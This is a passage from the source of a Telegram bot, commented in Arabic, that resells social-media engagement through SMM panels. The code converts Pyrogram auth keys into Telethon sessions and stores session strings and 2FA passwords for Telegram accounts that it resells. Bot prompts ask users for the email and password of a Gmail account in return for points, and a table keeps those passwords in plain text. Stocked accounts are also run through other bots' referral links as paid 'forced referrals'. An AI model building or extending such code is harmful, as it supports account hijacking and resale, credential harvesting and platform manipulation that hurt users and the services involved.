"""
بوت تيلغرام متكامل مع منصة SMMMAIN.COM وموقع JustAnotherPanel
المتغيرات المطلوبة في Railway:
  BOT_TOKEN                  - توكن البوت
  OWNER_ID                   - ايدي المالك
  API_KEY                    - مفتاح API لموقع SMMMAIN.COM (الموقع 1)
  JUSTANOTHERPANEL_API_KEY   - مفتاح API لموقع JustAnotherPanel.com (الموقع 2)
  ADMIN_GROUP_ID             - ايدي الكروب الذي تصله الطلبات
"""

import os
import re
import asyncio
import time
import random
import math
import html
import requests
import logging
import traceback
from datetime import date, datetime, timedelta, timezone
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    LabeledPrice, BotCommand, BotCommandScopeChat,
    KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, PreCheckoutQueryHandler,
    ChatMemberHandler, ContextTypes, filters
)
from telegram.constants import ParseMode
from telegram.error import NetworkError, TimedOut, RetryAfter, Conflict

from telethon import TelegramClient, events
from telethon.sessions import StringSession
import struct, base64, socket as _socket

# ────────────────────────────────────────────────────────────
# ────────────────────────────────────────────────────────────
_TG_DC = {
    1: ("149.154.175.53",  443),
    2: ("149.154.167.51",  443),
    3: ("149.154.175.100", 443),
    4: ("149.154.167.91",  443),
    5: ("91.108.56.130",   443),
}

def pyrogram_json_to_telethon(data: dict) -> str | None:
    """
    يحوّل صيغة Pyrogram JSON إلى Telethon StringSession.
    يتوقع dict يحتوي على:
      - dc_id   : رقم مركز البيانات (1-5)
      - auth_key: مفتاح المصادقة بصيغة hex (512 رمز = 256 بايت)
    يُرجع StringSession string جاهز للاستخدام، أو None عند الفشل.

    صيغة Telethon StringSession الصحيحة:
      '1' + base64url( struct.pack('>B4sH256s', dc_id, ip_bytes, port, auth_key) )
    """
    try:
        dc_id    = int(data.get("dc_id") or 0)
        auth_hex = (data.get("auth_key") or "").strip()
        if not dc_id or not auth_hex:
            return None
        auth_key = bytes.fromhex(auth_hex)
        if len(auth_key) != 256:
            return None
        ip, port = _TG_DC.get(dc_id, ("149.154.167.51", 443))
        packed = struct.pack(
            ">B4sH256s",
            dc_id,                      # dc_id  (1 byte)
            _socket.inet_aton(ip),      # IP     (4 bytes)
            port,                       # port   (2 bytes)
            auth_key,                   # key    (256 bytes)
        )
        return "1" + base64.urlsafe_b64encode(packed).decode("ascii")
    except Exception:
        return None

def _maybe_convert_session(raw: str) -> str:
    """
    إذا كانت raw عبارة عن JSON يحتوي dc_id + auth_key (صيغة Pyrogram)
    يحوّلها إلى Telethon StringSession ويُعيدها، وإلا يُعيد raw كما هي.
    """
    s = raw.strip()
    if s.startswith("{"):
        import json as _j
        try:
            d = _j.loads(s)
            converted = pyrogram_json_to_telethon(d)
            if converted:
                return converted
        except Exception:
            pass
    return s
from telethon.errors import (
    SessionPasswordNeededError, PhoneCodeInvalidError, PhoneCodeExpiredError,
    PhoneNumberInvalidError, FloodWaitError, PasswordHashInvalidError,
    PeerFloodError, UserBannedInChannelError, ChatWriteForbiddenError,
    UserPrivacyRestrictedError,
)
from telethon.tl.functions.auth import ResetAuthorizationsRequest, CheckPasswordRequest, AcceptLoginTokenRequest, ExportLoginTokenRequest
from telethon.password import compute_check
from telethon.tl.functions.account import (
    GetAuthorizationsRequest, ResetAuthorizationRequest,
    GetPasswordRequest, ResetPasswordRequest,
)
from telethon.tl.types import (
    account as tl_account,
)
from telethon.tl.functions.messages import StartBotRequest
from telethon.tl.functions.contacts import ResolveUsernameRequest
import pyotp

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s"
)
logger = logging.getLogger(__name__)

# ────────────────────────────────────────────────────────────
# ────────────────────────────────────────────────────────────
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK - Bot is running!")
    def log_message(self, format, *args):
        pass

def run_health_server():
    import socket as _hsock
    port = int(os.getenv("PORT", "8080"))
    server = HTTPServer(("0.0.0.0", port), HealthHandler)
    server.socket.setsockopt(_hsock.SOL_SOCKET, _hsock.SO_REUSEADDR, 1)
    server.serve_forever()

_health_server_started = False
def start_health_server():
    global _health_server_started
    if _health_server_started:
        return  # لا تُشغّل مرتين عند إعادة التشغيل الداخلية
    _health_server_started = True
    t = threading.Thread(target=run_health_server, daemon=True)
    t.start()
    logger.info("✅ Health server started")

# ────────────────────────────────────────────────────────────
# ────────────────────────────────────────────────────────────
def _safe_int_env(name: str, default: int = 0) -> int:
    """يقرأ متغير بيئة كرقم صحيح، ويرجع القيمة الافتراضية إذا كانت القيمة غير موجودة أو غير صالحة."""
    raw = os.getenv(name, "").strip()
    if not raw:
        return default
    try:
        return int(raw)
    except ValueError:
        logger.warning(f"⚠️ المتغير البيئي {name} له قيمة غير صالحة كرقم ({raw!r})، سيتم استخدام {default}.")
        return default

BOT_TOKEN      = os.getenv("BOT_TOKEN", "")
OWNER_ID       = _safe_int_env("OWNER_ID", 0)
API_KEY        = os.getenv("API_KEY", "")
ADMIN_GROUP_ID   = _safe_int_env("ADMIN_GROUP_ID", 0)
NUMBERS_GROUP_ID = _safe_int_env("NUMBERS_GROUP_ID", 0)  # كروب إشعارات الأرقام (منفصل عن كروب الطلبات)
API_URL        = "https://smmmain.com/api/v2"

JUSTANOTHERPANEL_API_KEY = os.getenv("JUSTANOTHERPANEL_API_KEY", "")
SMMFOLLOWS_API_KEY       = os.getenv("SMMFOLLOWS_API_KEY", "")
TELEGRAM_API_ID   = os.getenv("TELEGRAM_API_ID", "")
TELEGRAM_API_HASH = os.getenv("TELEGRAM_API_HASH", "")

_pending_number_logins = {}
_pending_supervisor_logins = {}   # supervisor_user_id -> {client, phone, phone_code_hash}
_buyer_received_codes = {}  # buyer_user_id -> {"code": str, "time": float} آخر كود وصل بعد البيع
_demo_purchases = {}        # buyer_user_id -> {"phone": str, "session_str": str, "twofa": str, "purchase_time": datetime} — شراء بكود تجريبي (لا يُسجَّل في prize_exchanges)
_pending_bulk_import  = set()  # user_ids ينتظرون إرسال JSON للاستيراد الجماعي
# stock_id -> {"phone", "session", "stock_id", "retries"} — حسابات تحتاج إصلاح تلقائي (طرد + 2FA)
_accounts_needing_fixup: dict = {}
_pending_group_msgs   = {}  # key -> {"text": str, "parse_mode": str} رسائل كروب معلّقة تنتظر موافقة المالك
_expected_2fa_change = {}
_referral_rate_tracker = {}  # inviter_id -> list[float] لكشف رشق الإحالات (5 في 5 ثوانٍ)
_EXPECTED_2FA_WINDOW_SEC = 180
_allow_5min_phones = {}  # phone_number -> {"until": float, "used": bool}
_permanently_allowed_phones = set()  # أرقام فيها جلسة خارجية مسموح لها بالبقاء للأبد
_OWN_BOT_USERNAME: str = ""          # يُضبط عند الإقلاع — يُستخدم لتخطي الإحالة الذاتية
JUSTANOTHERPANEL_API_URL = "https://justanotherpanel.com/api/v2"
SMMFOLLOWS_API_URL       = "https://smmfollows.io/api/v2"

# ────────────────────────────────────────────────────────────
# ────────────────────────────────────────────────────────────
PANEL_MAP = {
    1: {"name": "SMMMAIN",         "key": API_KEY,                  "url": API_URL},
    2: {"name": "JustAnotherPanel", "key": JUSTANOTHERPANEL_API_KEY, "url": JUSTANOTHERPANEL_API_URL},
    3: {"name": "SmmFollows",       "key": SMMFOLLOWS_API_KEY,       "url": SMMFOLLOWS_API_URL},
}

# ────────────────────────────────────────────────────────────
# ────────────────────────────────────────────────────────────
import psycopg2
import psycopg2.extras
import psycopg2.pool

DATABASE_URL = (
    os.environ.get("DATABASE_URL") or
    os.environ.get("DB_FILE") or
    os.environ.get("POSTGRES_URL") or
    os.environ.get("POSTGRESQL_URL") or
    ""
)

_pool = None
_pool_lock = threading.Lock()

def get_pool():
    global _pool
    if _pool is None:
        with _pool_lock:
            if _pool is None:
                _pool = psycopg2.pool.ThreadedConnectionPool(
                    1, 20, DATABASE_URL,
                    connect_timeout=10
                )
    return _pool

def reset_pool():
    """إعادة تهيئة pool الاتصالات عند حدوث خطأ فادح"""
    global _pool
    with _pool_lock:
        if _pool is not None:
            try:
                _pool.closeall()
            except Exception:
                pass
            _pool = None
    logger.warning("⚠️ تم إعادة تهيئة pool قاعدة البيانات")

class SmartCursor:
    """Wrapper يحوّل ? إلى %s ويعيد نفسه من execute() لدعم السلسلة .fetchone()"""
    def __init__(self, cur):
        self._cur = cur

    def execute(self, sql, params=None):
        sql = sql.replace('?', '%s')
        if params is None:
            self._cur.execute(sql)
        else:
            self._cur.execute(sql, params)
        return self

    def fetchone(self):
        return self._cur.fetchone()

    def fetchall(self):
        return self._cur.fetchall()

    @property
    def rowcount(self):
        return self._cur.rowcount

    def __iter__(self):
        return iter(self._cur)

_DB_RETRY_EXC = (psycopg2.OperationalError, psycopg2.InterfaceError)

class _DBContext:
    """
    مدير سياق آمن لاتصالات PostgreSQL.
    - يختبر الاتصال عند الاستحواذ ويعيد المحاولة مرة واحدة بعد reset_pool.
    - يعيد المحاولة في __exit__ عند فشل commit بسبب انقطاع الشبكة.
    - يُرجع الاتصال المكسور دائماً بـ close=True حتى لا يعود إلى الـ pool.
    """
    def __enter__(self):
        self._conn = None
        self._pool = None
        for attempt in range(2):
            try:
                self._pool = get_pool()
                self._conn = self._pool.getconn()
                cur = self._conn.cursor()
                cur.execute("SELECT 1")
                cur.close()
                break
            except _DB_RETRY_EXC as e:
                if attempt == 0:
                    logger.warning(f"⚠️ خطأ في الاتصال بالDB، إعادة المحاولة... ({e})")
                    if self._conn is not None and self._pool is not None:
                        try:
                            self._pool.putconn(self._conn, close=True)
                        except Exception:
                            pass
                        self._conn = None
                    reset_pool()
                else:
                    raise
        self._raw = self._conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor)
        return SmartCursor(self._raw)

    def __exit__(self, exc_type, exc_val, exc_tb):
        conn_broken = False
        try:
            if exc_type:
                self._conn.rollback()
            else:
                self._conn.commit()
        except _DB_RETRY_EXC as e:
            logger.warning(f"⚠️ فشل commit/rollback: {e}")
            conn_broken = True
            try:
                self._conn.rollback()
            except Exception:
                pass
        finally:
            try:
                self._raw.close()
            except Exception:
                pass
            if self._conn is not None and self._pool is not None:
                try:
                    self._pool.putconn(self._conn, close=conn_broken)
                except Exception:
                    pass
        return False

def db_conn():
    return _DBContext()

def with_db_retry(fn, *args, **kwargs):
    """
    تشغيل دالة تستخدم db_conn مع إعادة محاولة واحدة عند انقطاع الاتصال.
    مفيد لعمليات الكتابة الحساسة مثل set_setting.
    """
    for attempt in range(2):
        try:
            return fn(*args, **kwargs)
        except _DB_RETRY_EXC as e:
            if attempt == 0:
                logger.warning(f"⚠️ إعادة محاولة بعد خطأ DB: {e}")
                reset_pool()
            else:
                raise

def init_db():
      logger.info(f"🐘 PostgreSQL DB | DATABASE_URL configured: {bool(DATABASE_URL)}")
      with db_conn() as c:
          c.execute("""
          CREATE TABLE IF NOT EXISTS users (
              user_id      BIGINT PRIMARY KEY,
              username     TEXT,
              full_name    TEXT,
              points       INTEGER DEFAULT 0,
              invited_by   BIGINT DEFAULT 0,
              total_orders INTEGER DEFAULT 0,
              joined_at    TEXT DEFAULT CURRENT_DATE,
              bot_user_num INTEGER,
              verified     INTEGER DEFAULT 0
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS orders (
              id           SERIAL PRIMARY KEY,
              user_id      BIGINT,
              service_id   INTEGER,
              link         TEXT,
              quantity     INTEGER,
              cost_points  INTEGER DEFAULT 0,
              cost_stars   INTEGER DEFAULT 0,
              api_order_id TEXT DEFAULT '',
              status       TEXT DEFAULT 'pending',
              order_code   TEXT,
              created_at   TEXT DEFAULT CURRENT_TIMESTAMP
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS services (
              id              SERIAL PRIMARY KEY,
              category        TEXT,
              api_service_id  INTEGER,
              panel           INTEGER DEFAULT 1,
              name_ar         TEXT,
              description     TEXT,
              min_qty         INTEGER,
              max_qty         INTEGER,
              price_per_point REAL,
              active          INTEGER DEFAULT 1,
              service_type    TEXT DEFAULT 'smm'
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS mandatory_sub_orders (
              id            SERIAL PRIMARY KEY,
              user_id       BIGINT NOT NULL,
              bot_username  TEXT NOT NULL,
              start_param   TEXT NOT NULL,
              channels      TEXT DEFAULT '',
              quantity      INTEGER NOT NULL,
              cost_points   INTEGER NOT NULL,
              done_count    INTEGER DEFAULT 0,
              failed_count  INTEGER DEFAULT 0,
              status        TEXT DEFAULT 'pending',
              order_code    TEXT,
              created_at    TIMESTAMPTZ DEFAULT NOW()
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS forced_ref_orders (
              id            SERIAL PRIMARY KEY,
              user_id       BIGINT NOT NULL,
              bot_username  TEXT NOT NULL,
              start_param   TEXT NOT NULL,
              channels      TEXT DEFAULT '',
              quantity      INTEGER NOT NULL,
              cost_points   INTEGER NOT NULL,
              done_count    INTEGER DEFAULT 0,
              failed_count  INTEGER DEFAULT 0,
              status        TEXT DEFAULT 'pending',
              order_code    TEXT,
              created_at    TIMESTAMPTZ DEFAULT NOW()
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS settings (
              key   TEXT PRIMARY KEY,
              value TEXT
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS daily_gifts (
              user_id    BIGINT PRIMARY KEY,
              last_claim TEXT
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS channel_funding (
              id               SERIAL PRIMARY KEY,
              user_id          BIGINT,
              channel_username TEXT,
              funding_type     TEXT,
              cost_points      INTEGER,
              active           INTEGER DEFAULT 1,
              created_at       TEXT DEFAULT CURRENT_TIMESTAMP
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS star_transactions (
              id                  SERIAL PRIMARY KEY,
              user_id             BIGINT,
              stars               INTEGER,
              points_given        INTEGER,
              telegram_payment_id TEXT,
              status              TEXT DEFAULT 'completed',
              created_at          TEXT DEFAULT CURRENT_TIMESTAMP
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS point_transfers (
              id         SERIAL PRIMARY KEY,
              from_user  BIGINT,
              to_user    BIGINT,
              points     INTEGER,
              fee        INTEGER,
              created_at TEXT DEFAULT CURRENT_TIMESTAMP
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS prize_exchanges (
              id          SERIAL PRIMARY KEY,
              user_id     BIGINT,
              prize_type  TEXT,
              prize_value TEXT,
              points_cost INTEGER,
              status      TEXT DEFAULT 'pending',
              created_at  TEXT DEFAULT CURRENT_TIMESTAMP
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS number_stock (
              id            SERIAL PRIMARY KEY,
              phone_number  TEXT UNIQUE,
              assigned_to   BIGINT,
              assigned_at   TIMESTAMPTZ,
              added_at      TIMESTAMPTZ DEFAULT NOW()
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS mandatory_channels (
              id               SERIAL PRIMARY KEY,
              channel_username TEXT UNIQUE,
              channel_title    TEXT,
              owner_user_id    BIGINT DEFAULT 0,
              funding_type     TEXT DEFAULT 'mandatory',
              active           INTEGER DEFAULT 1
          )""")
          for _alt in [
              "ALTER TABLE channel_funding ADD COLUMN IF NOT EXISTS target_members INTEGER DEFAULT 0",
              "ALTER TABLE channel_funding ADD COLUMN IF NOT EXISTS current_members INTEGER DEFAULT 0",
              "ALTER TABLE channel_funding ADD COLUMN IF NOT EXISTS status TEXT DEFAULT 'active'",
              "ALTER TABLE mandatory_channels ADD COLUMN IF NOT EXISTS queued INTEGER DEFAULT 0",
              "ALTER TABLE prize_exchanges ADD COLUMN IF NOT EXISTS order_code TEXT",
              "ALTER TABLE prize_exchanges ADD COLUMN IF NOT EXISTS owner_seen BOOLEAN DEFAULT FALSE",
              "ALTER TABLE prize_exchanges ADD COLUMN IF NOT EXISTS compensated_at TIMESTAMPTZ",
              "ALTER TABLE prize_exchanges ADD COLUMN IF NOT EXISTS compensated_pts INTEGER DEFAULT 0",
              "ALTER TABLE prize_exchanges ADD COLUMN IF NOT EXISTS compensated_reason TEXT",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS ever_sold BOOLEAN DEFAULT FALSE",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS session_string TEXT",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS sessions_reset BOOLEAN DEFAULT FALSE",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS force_listed BOOLEAN DEFAULT FALSE",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS frozen_at TIMESTAMPTZ",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS twofa_password TEXT",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS last_frozen BOOLEAN DEFAULT FALSE",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS last_authorized BOOLEAN DEFAULT TRUE",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS last_device_count INTEGER DEFAULT -1",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS deleted_at TIMESTAMPTZ",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS kicked_at TIMESTAMPTZ",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS auto_2fa_enabled BOOLEAN DEFAULT FALSE",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS twofa_reset_date TIMESTAMPTZ",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS is_solo BOOLEAN DEFAULT FALSE",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS can_send_code BOOLEAN DEFAULT FALSE",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS bot_session_ip TEXT",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS forced_ref_excluded BOOLEAN DEFAULT FALSE",
              "ALTER TABLE services ADD COLUMN IF NOT EXISTS platform TEXT DEFAULT 'tg'",
              "ALTER TABLE users ADD COLUMN IF NOT EXISTS banned INTEGER DEFAULT 0",
              "ALTER TABLE users ADD COLUMN IF NOT EXISTS banned_at TIMESTAMPTZ",
              "ALTER TABLE users ADD COLUMN IF NOT EXISTS ban_reason TEXT",
              "ALTER TABLE channel_join_rewards ADD COLUMN IF NOT EXISTS joined_at TIMESTAMPTZ DEFAULT NOW()",
              "ALTER TABLE mandatory_sub_orders ADD COLUMN IF NOT EXISTS reactivated_count INTEGER DEFAULT 0",
              "ALTER TABLE number_stock ADD COLUMN IF NOT EXISTS referral_only BOOLEAN DEFAULT FALSE",
              "ALTER TABLE forced_ref_orders ADD COLUMN IF NOT EXISTS reactivated_count INTEGER DEFAULT 0",
              "ALTER TABLE forced_ref_orders ADD COLUMN IF NOT EXISTS payment_method TEXT DEFAULT 'points'",
              "ALTER TABLE forced_ref_orders ADD COLUMN IF NOT EXISTS cost_stars INTEGER DEFAULT 0",
          ]:
              try: c.execute(_alt)
              except Exception: pass
          c.execute("""
          CREATE TABLE IF NOT EXISTS channel_funding_counts (
              id         SERIAL PRIMARY KEY,
              user_id    BIGINT NOT NULL,
              funding_id INTEGER NOT NULL,
              UNIQUE(user_id, funding_id)
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS custom_prizes (
              id          SERIAL PRIMARY KEY,
              name        TEXT NOT NULL,
              quantity    INTEGER DEFAULT 1,
              points_cost INTEGER NOT NULL,
              active      INTEGER DEFAULT 1,
              created_at  TEXT DEFAULT CURRENT_TIMESTAMP
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS promo_codes (
              code       TEXT PRIMARY KEY,
              max_uses   INTEGER DEFAULT 1,
              used_count INTEGER DEFAULT 0,
              points     INTEGER DEFAULT 0,
              active     INTEGER DEFAULT 1,
              created_at TEXT DEFAULT CURRENT_TIMESTAMP
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS promo_uses (
              code    TEXT,
              user_id BIGINT,
              used_at TIMESTAMPTZ DEFAULT NOW(),
              PRIMARY KEY (code, user_id)
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS number_purchase_codes (
              code       TEXT PRIMARY KEY,
              max_uses   INTEGER DEFAULT 1,
              used_count INTEGER DEFAULT 0,
              active     INTEGER DEFAULT 1,
              created_at TEXT DEFAULT CURRENT_TIMESTAMP
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS number_purchase_code_uses (
              code    TEXT,
              user_id BIGINT,
              used_at TIMESTAMPTZ DEFAULT NOW(),
              PRIMARY KEY (code, user_id)
          )""")
          try:
              c.execute("ALTER TABLE promo_uses ADD COLUMN IF NOT EXISTS used_at TIMESTAMPTZ DEFAULT NOW()")
          except Exception:
              pass
          c.execute("""
          CREATE TABLE IF NOT EXISTS exchange_star_packages (
              id     SERIAL PRIMARY KEY,
              stars  INTEGER NOT NULL,
              active INTEGER DEFAULT 1
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS channel_join_rewards (
              user_id    BIGINT,
              channel_id BIGINT,
              joined_at  TIMESTAMPTZ DEFAULT NOW(),
              PRIMARY KEY (user_id, channel_id)
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS referral_tasks (
              id                  SERIAL PRIMARY KEY,
              label               TEXT NOT NULL,
              bot_username        TEXT NOT NULL,
              start_param         TEXT NOT NULL,
              mandatory_channels  TEXT DEFAULT '',
              folder_link         TEXT DEFAULT '',
              active              INTEGER DEFAULT 1,
              created_at          TIMESTAMPTZ DEFAULT NOW()
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS referral_completions (
              task_id   INTEGER NOT NULL,
              stock_id  INTEGER NOT NULL,
              status    TEXT DEFAULT 'pending',
              done_at   TIMESTAMPTZ,
              error_msg TEXT,
              PRIMARY KEY (task_id, stock_id)
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS supervisors (
              id         SERIAL PRIMARY KEY,
              user_id    BIGINT UNIQUE NOT NULL,
              username   TEXT DEFAULT '',
              added_at   TIMESTAMPTZ DEFAULT NOW()
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS supervisor_accounts (
              id             SERIAL PRIMARY KEY,
              supervisor_id  BIGINT NOT NULL,
              phone_number   TEXT NOT NULL,
              session_string TEXT,
              added_at       TIMESTAMPTZ DEFAULT NOW(),
              UNIQUE(supervisor_id, phone_number)
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS gmail_submissions (
              id          SERIAL PRIMARY KEY,
              user_id     BIGINT NOT NULL,
              gmail_email TEXT NOT NULL,
              gmail_pass  TEXT NOT NULL,
              verification_note TEXT DEFAULT '',
              status      TEXT DEFAULT 'pending',
              created_at  TIMESTAMPTZ DEFAULT NOW()
          )""")
          c.execute("""
          CREATE TABLE IF NOT EXISTS menu_items (
              id           SERIAL PRIMARY KEY,
              menu         TEXT,
              label        TEXT,
              action_type  TEXT DEFAULT 'builtin',
              action_value TEXT,
              width        INTEGER DEFAULT 2,
              sort_order   INTEGER DEFAULT 0,
              enabled      INTEGER DEFAULT 1
          )""")
          default_settings = [
              ('join_channel_reward', '45'),
              ('daily_gift_points', '50'),
              ('referral_points', '30'),
              ('star_to_points', '250'),
              ('exchange_star_rate', '2000'),
              ('telegram_number_cost', '5000'),
              ('transfer_fee_percent', '1'),
              ('mandatory_channel_cost', '200'),
              ('internal_channel_cost', '100'),
              ('welcome_message', 'أهلاً وسهلاً بك في البوت!'),
              ('owner_contact', ''),
              ('total_bot_orders', '0'),
              ('total_bot_users', '0'),
              ('asiacell_text', '⚠️ الشحن التلقائي عبر اسيا سيل غير متاح حالياً.\nيرجى التواصل مع المالك.'),
              ('captcha_enabled', '0'),
              ('maintenance_mode', '0'),
              ('number_exchange_enabled', '0'),
              ('exchange_success_msg', ''),
              ('mandatory_channel_min_members', '0'),
              ('internal_channel_min_members', '0'),
              ('owner_contact_label', '💬 تواصل مع المالك'),
              ('support_contact_label', '🛎 تواصل مع الدعم'),
              ('thank_owner_button_label', '💌 شكر المالك'),
              ('thank_owner_ar_button_label', '🇸🇦 رسالة بالعربية'),
              ('thank_owner_en_button_label', '🇬🇧 Message in English'),
              ('thank_owner_photo_button_label', '🖼️ إرسال صورة'),
              ('thank_owner_ar_prompt', '💌 أرسل رسالة الشكر بالعربية:'),
              ('thank_owner_en_prompt', '💌 Send your thank-you message in English:'),
              ('thank_owner_photo_prompt', '🖼️ أرسل الصورة التي تريد مشاركتها مع المالك:'),
              ('thank_owner_success_message', '✅ تم إرسال شكرك إلى المالك، شكراً لك!'),
              ('channel_leave_penalty', '75'),
              ('mandatory_stars_min_members', '50'),
              ('mandatory_stars_tier1_max', '120'),
              ('mandatory_stars_tier1_price_x100', '50'),   # 0.50 نجمة × 100
                            ('mandatory_stars_tier2_price_x100', '33'),   # 0.33 نجمة × 100
              ('mandatory_points_price', '5'),    # سعر العضو الواحد بالنقاط
              ('mandatory_points_min',   '50'),   # الحد الأدنى للأعضاء
              ('mansub_base_price',    '250'),
              ('mansub_channel_price', '50'),
              ('mansub_visible',       '0'),
              ('forced_ref_base_price',         '250'),   # سعر الإحالة بدون تحقق (نقاط/حساب)
              ('forced_ref_ai_base_price',      '300'),   # سعر الإحالة بتحقق (نقاط/حساب)
              ('forced_ref_channel_price',      '25'),    # سعر القناة (نقاط/قناة) — للنوعين
              ('forced_ref_channel_stars_no_ai','25'),    # سعر القناة بالنجوم — بدون تحقق
              ('forced_ref_channel_stars_ai',   '35'),    # سعر القناة بالنجوم — بتحقق
              ('forced_ref_visible',            '0'),
              ('forced_ref_ai_visible',         '0'),
              ('referral_task_delay',            '30'),  # تأخير بين الحسابات في مهام الإحالة (ثوانٍ)
              ('forced_ref_order_delay',         '60'),  # تأخير بين الحسابات في الطلبات المدفوعة — للمالك فقط (ثوانٍ)
              ('internal_leave_grace_hours', '24'),
              ('gmail_points_reward', '10000'),
              ('gmail_intro_message', 'للحصول على النقاط يجب عليك تقديم حساب جيميل لا تستخدمه، سيتم مراجعته من قبل المالك وإضافة النقاط بعد التحقق.'),
              ('gmail_button_label', '📧 احصل على نقاط مقابل إيميل جيميل'),
              ('gmail_email_prompt', '📧 *أرسل الإيميل*\n\nأرسل عنوان البريد الإلكتروني فقط بدون أي شيء آخر:'),
              ('gmail_password_prompt', '🔐 *أرسل الباسورد*\n\nأرسل كلمة مرور الحساب فقط بدون أي شيء آخر:'),
              ('gmail_verification_note_prompt', '💬 <b>اكتب رسالتك للمالك</b>\n\nيجب كتابة ملاحظة قبل إرسال إشعار إكمال التحقق.'),
              ('gmail_reject_wrong_email_msg', '❌ تم رفض طلبك بسبب أن الإيميل الذي أرسلته خاطئ أو غير صحيح. يرجى التحقق من الإيميل والمحاولة مجدداً.'),
              ('gmail_reject_wrong_pass_caption', '❌ تم رفض طلبك بسبب أن كلمة المرور خاطئة. شاهد الفيديو التالي لمعرفة كيفية إدخال الباسورد الصحيح.'),
              ('gmail_reject_wrong_pass_video', ''),
              ('gmail_reject_need_verify_caption', '❌ تم رفض طلبك لأن الحساب يحتاج إلى تحقق. شاهد الفيديو التالي لمعرفة كيفية إتمام التحقق.'),
              ('gmail_reject_need_verify_video', ''),
          ]
          for k, v in default_settings:
              c.execute(
                  "INSERT INTO settings (key, value) VALUES (%s, %s) ON CONFLICT (key) DO NOTHING",
                  (k, v)
              )
      try:
          with db_conn() as c:
              c.execute("ALTER TABLE users ADD COLUMN verified INTEGER DEFAULT 0")
      except Exception:
          pass
      try:
          with db_conn() as c:
              c.execute(
                  "ALTER TABLE gmail_submissions "
                  "ADD COLUMN IF NOT EXISTS rejection_reason TEXT DEFAULT ''"
              )
              c.execute(
                  "ALTER TABLE gmail_submissions "
                  "ADD COLUMN IF NOT EXISTS verification_completed BOOLEAN DEFAULT FALSE"
              )
              c.execute(
                  "ALTER TABLE gmail_submissions "
                  "ADD COLUMN IF NOT EXISTS verification_notified BOOLEAN DEFAULT FALSE"
              )
              c.execute(
                  "ALTER TABLE gmail_submissions "
                  "ADD COLUMN IF NOT EXISTS verification_note TEXT DEFAULT ''"
              )
      except Exception as e:
          logger.warning(f"⚠️ فشل تحديث أعمدة تحقق الإيميل: {e}")
      try:
          with db_conn() as c:
              c.execute("ALTER TABLE services ADD COLUMN panel INTEGER DEFAULT 1")
      except Exception:
          pass
      try:
          with db_conn() as c:
              c.execute("ALTER TABLE users ADD COLUMN referral_credited INTEGER DEFAULT 0")
              c.execute("UPDATE users SET referral_credited=1 WHERE invited_by IS NOT NULL AND invited_by != 0")
      except Exception:
          pass
      try:
          with db_conn() as c:
              c.execute("ALTER TABLE orders ADD COLUMN IF NOT EXISTS partial_refund_pts INTEGER DEFAULT 0")
      except Exception:
          pass
      try:
          with db_conn() as c:
              c.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS referral_points_blocked INTEGER DEFAULT 0")
      except Exception:
          pass
      try:
          with db_conn() as c:
              c.execute("ALTER TABLE users ADD COLUMN IF NOT EXISTS credited_at TIMESTAMPTZ")
              c.execute(
                  "UPDATE users SET credited_at=joined_at::timestamptz "
                  "WHERE referral_credited=1 AND credited_at IS NULL"
              )
      except Exception as e:
          logger.warning(f"⚠️ فشل تعبئة credited_at للدعوات القديمة: {e}")
      try:
          with db_conn() as c:
              fixed = c.execute(
                  "UPDATE mandatory_channels SET funding_type='mandatory' "
                  "WHERE funding_type='mandatory_points'"
              ).rowcount
          if fixed:
              logger.info(f"✅ تم تصحيح {fixed} قناة إجبارية كانت مخزّنة بـ mandatory_points → mandatory")
      except Exception as e:
          logger.warning(f"⚠️ فشل تصحيح القنوات الإجبارية القديمة: {e}")

      try:
          with db_conn() as c:
